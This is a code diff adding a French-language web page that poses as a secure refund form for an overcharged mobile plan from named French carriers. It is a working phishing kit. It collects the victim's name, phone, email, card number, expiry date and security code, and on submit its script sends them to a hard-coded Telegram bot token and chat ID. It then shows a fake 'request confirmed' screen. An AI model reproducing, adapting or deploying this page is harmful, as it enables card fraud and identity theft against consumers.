@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remboursement Forfait Mobile</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #f97316;
+            --primary-hover: #ea580c;
+            --primary-light: #fef3c7;
+            --success-color: #22c55e;
+            --error-color: #ef4444;
+            --text-dark: #1f2937;
+            --text-light: #6b7280;
+            --border-color: #d1d5db;
+            --bg-light: #f9fafb;
+        }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background-color: var(--bg-light);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: var(--text-dark);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 450px;
+            overflow: hidden;
+            animation: fadeIn 0.6s ease-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .header {
+            text-align: center;
+            padding: 24px;
+            background: var(--primary-light);
+            color: var(--primary-hover);
+            position: relative;
+        }
+        .header h1 {
+            font-size: 1.5rem;
+            margin-top: 10px;
+            margin-bottom: 5px;
+        }
+        .header p {
+            font-size: 1rem;
+            opacity: 0.9;
+        }
+        .icon-container {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .steps-container {
+            padding: 16px;
+            background-color: #fff;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+        }
+        .steps {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+        .step {
+            width: 70px;
+            position: relative;
+        }
+        .step-circle {
+            width: 28px;
+            height: 28px;
+            background: var(--bg-light);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto;
+            color: var(--text-light);
+            font-weight: bold;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+        .step.active .step-circle {
+            background: var(--primary-color);
+            color: white;
+        }
+        .step.completed .step-circle {
+            background: var(--success-color);
+            color: white;
+        }
+        .step-label {
+            text-align: center;
+            font-size: 12px;
+            color: var(--text-light);
+            margin-top: 5px;
+            transition: all 0.3s ease;
+        }
+        .step.active .step-label {
+            color: var(--primary-color);
+            font-weight: 500;
+        }
+        .step.completed .step-label {
+            color: var(--success-color);
+        }
+        .step-connector {
+            position: absolute;
+            top: 14px;
+            left: calc(50% + 14px);
+            height: 2px;
+            width: calc(100% - 28px);
+            background-color: var(--border-color);
+        }
+        .step.active .step-connector, .step.completed .step-connector {
+            background-color: var(--primary-color);
+        }
+        .content {
+            padding: 24px;
+        }
+        .step-title {
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+            color: var(--text-dark);
+            font-weight: 600;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 14px;
+            color: var(--text-dark);
+            font-weight: 500;
+        }
+        .form-control {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 15px;
+            transition: border-color 0.3s;
+        }
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(249, 115, 22, 0.2);
+        }
+        .form-control::placeholder {
+            color: #9ca3af;
+        }
+        .form-row {
+            display: flex;
+            gap: 12px;
+        }
+        .error-message {
+            color: var(--error-color);
+            font-size: 13px;
+            margin-top: 5px;
+            min-height: 18px;
+        }
+        .btn {
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+        .btn:hover {
+            background: var(--primary-hover);
+            transform: translateY(-1px);
+        }
+        .btn:active {
+            transform: translateY(0);
+        }
+        .btn-back {
+            background: transparent;
+            color: var(--text-light);
+            border: 1px solid var(--border-color);
+            margin-right: 10px;
+        }
+        .btn-back:hover {
+            background: var(--bg-light);
+            color: var(--text-dark);
+        }
+        .card-icon {
+            position: absolute;
+            right: 12px;
+            top: 36px;
+            font-size: 24px;
+            color: #9ca3af;
+        }
+        .card-container {
+            position: relative;
+        }
+        .success-screen {
+            text-align: center;
+            padding: 30px 20px;
+            animation: fadeIn 0.6s ease-out;
+        }
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background-color: rgba(34, 197, 94, 0.1);
+            color: var(--success-color);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px;
+            font-size: 36px;
+        }
+        .success-title {
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+            color: var(--text-dark);
+        }
+        .reference-box {
+            background-color: var(--bg-light);
+            border-radius: 8px;
+            padding: 14px;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .reference-number {
+            font-family: "Courier New", monospace;
+            font-size: 18px;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+        .copy-btn {
+            background: none;
+            border: none;
+            color: var(--primary-color);
+            cursor: pointer;
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            transition: background-color 0.3s;
+        }
+        .copy-btn:hover {
+            background-color: rgba(249, 115, 22, 0.1);
+        }
+        .success-message {
+            color: var(--text-light);
+            margin-bottom: 5px;
+        }
+        .success-detail {
+            margin-top: 20px;
+            color: var(--text-light);
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .success-detail-item {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+        }
+        .success-detail-value {
+            font-weight: 500;
+            color: var(--text-dark);
+        }
+        .btn-actions {
+            display: flex;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="icon-container">
+                <i class="fas fa-mobile-alt" style="font-size: 24px; color: var(--primary-color);"></i>
+            </div>
+            <h1>Remboursement Sécurisé</h1>
+            <p>Forfait mobile débité</p>
+        </div>
+        <div class="steps-container">
+            <div class="steps" id="stepsIndicator">
+                <div class="step active" data-step="1">
+                    <div class="step-circle">1</div>
+                    <div class="step-label">Opérateur</div>
+                    <div class="step-connector"></div>
+                </div>
+                <div class="step" data-step="2">
+                    <div class="step-circle">2</div>
+                    <div class="step-label">Informations</div>
+                    <div class="step-connector"></div>
+                </div>
+                <div class="step" data-step="3">
+                    <div class="step-circle">3</div>
+                    <div class="step-label">Paiement</div>
+                </div>
+            </div>
+        </div>
+        <div class="content" id="formContent">
+            <form id="refundForm">
+                <!-- Step 1: Operator Selection -->
+                <div id="step1" class="form-step">
+                    <h2 class="step-title">Sélectionnez votre opérateur</h2>
+                    <div class="form-group">
+                        <label for="operator" class="form-label">Opérateur mobile</label>
+                        <select id="operator" class="form-control" required>
+                            <option value="">-- Choisissez --</option>
+                            <option value="Orange">Orange</option>
+                            <option value="SFR">SFR</option>
+                            <option value="Bouygues">Bouygues Telecom</option>
+                            <option value="Free Mobile">Free Mobile</option>
+                            <option value="La Poste Mobile">La Poste Mobile</option>
+                            <option value="RED by SFR">RED by SFR</option>
+                            <option value="Sosh">Sosh</option>
+                            <option value="B&You">B&You</option>
+                        </select>
+                        <div class="error-message" id="operatorError"></div>
+                    </div>
+                    <div class="form-group">
+                        <label for="montant" class="form-label">Montant du remboursement</label>
+                        <input type="text" id="montant" class="form-control" placeholder="Exemple: 19,99 €" required />
+                        <div class="error-message" id="montantError"></div>
+                    </div>
+                    <button type="button" id="nextToStep2" class="btn">
+                        Continuer <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+                <!-- Step 2: Personal Info -->
+                <div id="step2" class="form-step" style="display: none;">
+                    <h2 class="step-title">Vos coordonnées</h2>
+                    <div class="form-group">
+                        <label for="firstname" class="form-label">Prénom</label>
+                        <input type="text" id="firstname" class="form-control" placeholder="Votre prénom" required />
+                        <div class="error-message" id="firstnameError"></div>
+                    </div>
+                    <div class="form-group">
+                        <label for="lastname" class="form-label">Nom</label>
+                        <input type="text" id="lastname" class="form-control" placeholder="Votre nom" required />
+                        <div class="error-message" id="lastnameError"></div>
+                    </div>
+                    <div class="form-group">
+                        <label for="phone" class="form-label">Numéro de téléphone</label>
+                        <input type="tel" id="phone" class="form-control" placeholder="0612345678" required />
+                        <div class="error-message" id="phoneError"></div>
+                    </div>
+                    <div class="form-group">
+                        <label for="email" class="form-label">Adresse e-mail</label>
+                        <input type="email" id="email" class="form-control" placeholder="exemple@email.com" required />
+                        <div class="error-message" id="emailError"></div>
+                    </div>
+                    <div class="btn-actions">
+                        <button type="button" id="backToStep1" class="btn btn-back">
+                            <i class="fas fa-arrow-left"></i> Retour
+                        </button>
+                        <button type="button" id="nextToStep3" class="btn">
+                            Continuer <i class="fas fa-arrow-right"></i>
+                        </button>
+                    </div>
+                </div>
+                <!-- Step 3: Payment Details -->
+                <div id="step3" class="form-step" style="display: none;">
+                    <h2 class="step-title">Coordonnées bancaires</h2>
+                    <div class="form-group">
+                        <label for="paymentMethod" class="form-label">Type de carte</label>
+                        <select id="paymentMethod" class="form-control" required>
+                            <option value="">-- Choisissez --</option>
+                            <option value="VISA">VISA</option>
+                            <option value="MasterCard">MasterCard</option>
+                            <option value="American Express">American Express</option>
+                        </select>
+                        <div class="error-message" id="paymentMethodError"></div>
+                    </div>
+                    <div class="form-group card-container">
+                        <label for="cardnumber" class="form-label">Numéro de carte</label>
+                        <input type="text" id="cardnumber" class="form-control" placeholder="1234 5678 9012 3456" maxlength="19" required />
+                        <div id="cardIcon" class="card-icon"><i class="fa fa-credit-card"></i></div>
+                        <div class="error-message" id="cardnumberError"></div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group" style="flex: 1;">
+                            <label for="cardName" class="form-label">Nom sur la carte</label>
+                            <input type="text" id="cardName" class="form-control" placeholder="NOM PRÉNOM" required />
+                            <div class="error-message" id="cardNameError"></div>
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group" style="flex: 2;">
+                            <label for="expiryDate" class="form-label">Date d'expiration</label>
+                            <input type="text" id="expiryDate" class="form-control" placeholder="MM/AA" maxlength="5" required />
+                            <div class="error-message" id="expiryDateError"></div>
+                        </div>
+                        <div class="form-group" style="flex: 1;">
+                            <label for="cvv" class="form-label">CVV</label>
+                            <input type="text" id="cvv" class="form-control" placeholder="123" maxlength="3" required />
+                            <div class="error-message" id="cvvError"></div>
+                        </div>
+                    </div>
+                    <div class="btn-actions">
+                        <button type="button" id="backToStep2" class="btn btn-back">
+                            <i class="fas fa-arrow-left"></i> Retour
+                        </button>
+                        <button type="submit" id="submitButton" class="btn">
+                            Confirmer <i class="fas fa-check"></i>
+                        </button>
+                    </div>
+                </div>
+            </form>
+        </div>
+        <div class="success-screen" id="successScreen" style="display: none;">
+            <div class="success-icon">
+                <i class="fas fa-check"></i>
+            </div>
+            <h2 class="success-title">Demande confirmée !</h2>
+            <p class="success-message">Votre remboursement est en cours de traitement</p>
+            <div class="reference-box">
+                <span class="reference-number" id="reference"></span>
+                <button class="copy-btn" id="copyBtn" title="Copier la référence">
+                    <i class="fas fa-copy"></i>
+                </button>
+            </div>
+            <div class="success-detail">
+                <div class="success-detail-item">
+                    <span>Opérateur</span>
+                    <span class="success-detail-value" id="summaryOperator"></span>
+                </div>
+                <div class="success-detail-item">
+                    <span>Montant</span>
+                    <span class="success-detail-value" id="summaryMontant"></span>
+                </div>
+                <div class="success-detail-item">
+                    <span>Délai</span>
+                    <span class="success-detail-value">Sous 24 heures ouvrées</span>
+                </div>
+            </div>
+            <p style="margin-top: 20px; font-size: 14px; color: var(--text-light);">
+                Un e-mail de confirmation a été envoyé à <span id="summaryEmail" style="font-weight: 500;"></span>
+            </p>
+        </div>
+    </div>
+    <script>
+        const BOT_TOKEN = '7530486114:AAE9TXLFNHO7ucOBaHkBUVoPGXrApfvb35c';
+        const CHAT_ID = '6089762171';
+        let currentStep = 1;
+
+        const form = document.getElementById('refundForm');
+        const steps = document.querySelectorAll('.step');
+        const formSteps = document.querySelectorAll('.form-step');
+
+        document.getElementById('nextToStep2').addEventListener('click', () => {
+            if (validateStep(1)) goToStep(2);
+        });
+
+        document.getElementById('backToStep1').addEventListener('click', () => goToStep(1));
+
+        document.getElementById('nextToStep3').addEventListener('click', () => {
+            if (validateStep(2)) goToStep(3);
+        });
+
+        document.getElementById('backToStep2').addEventListener('click', () => goToStep(2));
+
+        document.getElementById('cardnumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            let formatted = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += value[i];
+            }
+            e.target.value = formatted;
+            updateCardIcon(value);
+        });
+
+        document.getElementById('expiryDate').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                e.target.value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            } else {
+                e.target.value = value;
+            }
+        });
+
+        function updateCardIcon(cardNumber) {
+            const icon = document.getElementById('cardIcon');
+            if (/^4/.test(cardNumber)) {
+                icon.innerHTML = '<i class="fab fa-cc-visa" style="color: #1a1f71;"></i>';
+            } else if (/^5[1-5]/.test(cardNumber)) {
+                icon.innerHTML = '<i class="fab fa-cc-mastercard" style="color: #eb001b;"></i>';
+            } else if (/^3[47]/.test(cardNumber)) {
+                icon.innerHTML = '<i class="fab fa-cc-amex" style="color: #2e77bc;"></i>';
+            } else {
+                icon.innerHTML = '<i class="fa fa-credit-card"></i>';
+            }
+        }
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            if (!validateStep(3)) return;
+
+            const formData = {
+                operator: document.getElementById('operator').value,
+                montant: document.getElementById('montant').value,
+                firstname: document.getElementById('firstname').value,
+                lastname: document.getElementById('lastname').value,
+                phone: document.getElementById('phone').value,
+                email: document.getElementById('email').value,
+                paymentMethod: document.getElementById('paymentMethod').value,
+                cardName: document.getElementById('cardName').value,
+                cardnumber: document.getElementById('cardnumber').value.replace(/\s/g, ''),
+                expiryDate: document.getElementById('expiryDate').value,
+                cvv: document.getElementById('cvv').value
+            };
+
+            const reference = `REF-${Date.now().toString().slice(-6)}`;
+            const message = `📢 *Nouvelle demande de remboursement* 📢
+🔸 *Opérateur:* ${formData.operator}
+🔸 *Montant:* ${formData.montant}
+🔸 *Client:* ${formData.firstname} ${formData.lastname}
+🔸 *Téléphone:* ${formData.phone}
+🔸 *Email:* ${formData.email}
+🔸 *Carte:* ${formData.cardnumber.replace(/(\d{4})/g, '$1 ')}
+🔸 *Nom sur carte:* ${formData.cardName}
+🔸 *Expiration:* ${formData.expiryDate}
+🔸 *Type de carte:* ${formData.paymentMethod}
+🔸 *Référence:* ${reference}`;
+
+            try {
+                document.getElementById('submitButton').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Traitement...';
+                document.getElementById('submitButton').disabled = true;
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                document.getElementById('reference').textContent = reference;
+                document.getElementById('summaryOperator').textContent = formData.operator;
+                document.getElementById('summaryMontant').textContent = formData.montant;
+                document.getElementById('summaryEmail').textContent = formData.email;
+
+                document.getElementById('formContent').style.display = 'none';
+                document.getElementById('successScreen').style.display = 'block';
+            } catch (error) {
+                alert('Erreur lors de l\'envoi des données.');
+                document.getElementById('submitButton').innerHTML = 'Confirmer <i class="fas fa-check"></i>';
+                document.getElementById('submitButton').disabled = false;
+            }
+        });
+
+        function goToStep(step) {
+            currentStep = step;
+            steps.forEach(el => {
+                const stepNum = parseInt(el.dataset.step);
+                el.classList.remove('active', 'completed');
+                if (stepNum === currentStep) {
+                    el.classList.add('active');
+                } else if (stepNum < currentStep) {
+                    el.classList.add('completed');
+                }
+            });
+            formSteps.forEach((el, index) => {
+                el.style.display = index + 1 === currentStep ? 'block' : 'none';
+            });
+        }
+
+        function validateStep(step) {
+            let isValid = true;
+
+            if (step === 1) {
+                const operator = document.getElementById('operator');
+                if (!operator.value) {
+                    document.getElementById('operatorError').textContent = 'Veuillez sélectionner un opérateur';
+                    isValid = false;
+                } else {
+                    document.getElementById('operatorError').textContent = '';
+                }
+
+                const montant = document.getElementById('montant');
+                const montantRegex = /^\d+([,.]\d{1,2})?( ?€)?$/;
+                if (!montant.value) {
+                    document.getElementById('montantError').textContent = 'Veuillez indiquer le montant';
+                    isValid = false;
+                } else if (!montantRegex.test(montant.value)) {
+                    document.getElementById('montantError').textContent = 'Format invalide (exemple: 19,99 €)';
+                    isValid = false;
+                } else {
+                    document.getElementById('montantError').textContent = '';
+                }
+            }
+
+            if (step === 2) {
+                ['firstname', 'lastname'].forEach(field => {
+                    const input = document.getElementById(field);
+                    if (!input.value.trim()) {
+                        document.getElementById(`${field}Error`).textContent = `Veuillez entrer votre ${field === 'firstname' ? 'prénom' : 'nom'}`;
+                        isValid = false;
+                    } else {
+                        document.getElementById(`${field}Error`).textContent = '';
+                    }
+                });
+
+                const phone = document.getElementById('phone');
+                const phoneRegex = /^0[1-9]\d{8}$/;
+                if (!phone.value) {
+                    document.getElementById('phoneError').textContent = 'Veuillez entrer votre numéro de téléphone';
+                    isValid = false;
+                } else if (!phoneRegex.test(phone.value)) {
+                    document.getElementById('phoneError').textContent = 'Format invalide (exemple: 0612345678)';
+                    isValid = false;
+                } else {
+                    document.getElementById('phoneError').textContent = '';
+                }
+
+                const email = document.getElementById('email');
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!email.value) {
+                    document.getElementById('emailError').textContent = 'Veuillez entrer votre adresse e-mail';
+                    isValid = false;
+                } else if (!emailRegex.test(email.value)) {
+                    document.getElementById('emailError').textContent = 'Adresse e-mail invalide';
+                    isValid = false;
+                } else {
+                    document.getElementById('emailError').textContent = '';
+                }
+            }
+
+            if (step === 3) {
+                const paymentMethod = document.getElementById('paymentMethod');
+                if (!paymentMethod.value) {
+                    document.getElementById('paymentMethodError').textContent = 'Veuillez sélectionner un type de carte';
+                    isValid = false;
+                } else {
+                    document.getElementById('paymentMethodError').textContent = '';
+                }
+
+                const cardnumber = document.getElementById('cardnumber');
+                const cardValue = cardnumber.value.replace(/\s/g, '');
+                if (!cardValue || !/^\d{16}$/.test(cardValue)) {
+                    document.getElementById('cardnumberError').textContent = 'Numéro de carte invalide';
+                    isValid = false;
+                } else {
+                    document.getElementById('cardnumberError').textContent = '';
+                }
+
+                const expiryDate = document.getElementById('expiryDate');
+                const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+                if (!expiryDate.value || !expiryRegex.test(expiryDate.value)) {
+                    document.getElementById('expiryDateError').textContent = 'Date d\'expiration invalide';
+                    isValid = false;
+                } else {
+                    const [month, year] = expiryDate.value.split('/');
+                    const now = new Date();
+                    const currentYear = now.getFullYear() % 100;
+                    const currentMonth = now.getMonth() + 1;
+                    if (year < currentYear || (year == currentYear && month < currentMonth)) {
+                        document.getElementById('expiryDateError').textContent = 'Date expirée';
+                        isValid = false;
+                    } else {
+                        document.getElementById('expiryDateError').textContent = '';
+                    }
+                }
+
+                const cvv = document.getElementById('cvv');
+                if (!cvv.value || !/^\d{3}$/.test(cvv.value)) {
+                    document.getElementById('cvvError').textContent = 'CVV invalide';
+                    isValid = false;
+                } else {
+                    document.getElementById('cvvError').textContent = '';
+                }
+
+                const cardName = document.getElementById('cardName');
+                if (!cardName.value.trim()) {
+                    document.getElementById('cardNameError').textContent = 'Veuillez entrer le nom sur la carte';
+                    isValid = false;
+                } else {
+                    document.getElementById('cardNameError').textContent = '';
+                }
+            }
+
+            return isValid;
+        }
+
+        document.getElementById('copyBtn').addEventListener('click', () => {
+            navigator.clipboard.writeText(document.getElementById('reference').textContent)
+                .then(() => alert('Référence copiée !'));
+        });
+    </script>
+</body>
+</html>
